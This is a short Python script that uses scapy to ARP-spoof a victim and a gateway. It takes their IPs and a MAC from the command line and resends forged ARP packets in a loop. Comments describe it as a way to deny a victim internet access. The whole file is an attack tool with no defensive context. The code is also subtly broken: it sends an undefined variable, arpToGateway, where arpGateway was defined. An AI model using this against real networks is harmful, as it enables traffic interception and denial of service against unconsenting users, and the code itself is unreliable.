from scapy.all import *
import time
import sys
#fill in mac, gate, and victim
#gate is gateways ip 
#victim is victims ip 
#use sendp 
#mac = your mac 
cmdargs = str(sys.argv)
op = 1
#good way to deny internet to victim is removing time.sleep(x) and sending arpToVictim
#This only works on some routers, usually just denies 
arpToVictim = ARP(op=op,psrc=sys.argv[1],pdst=sys.argv[2],hwdst=sys.argv[3])
arpGateway = ARP(op=op,pdst=sys.argv[1],psrc=sys.argv[2],hwdst=sys.argv[3])

while 1:
	send (arpToVictim)
	send(arpToGateway)
	time.sleep(5)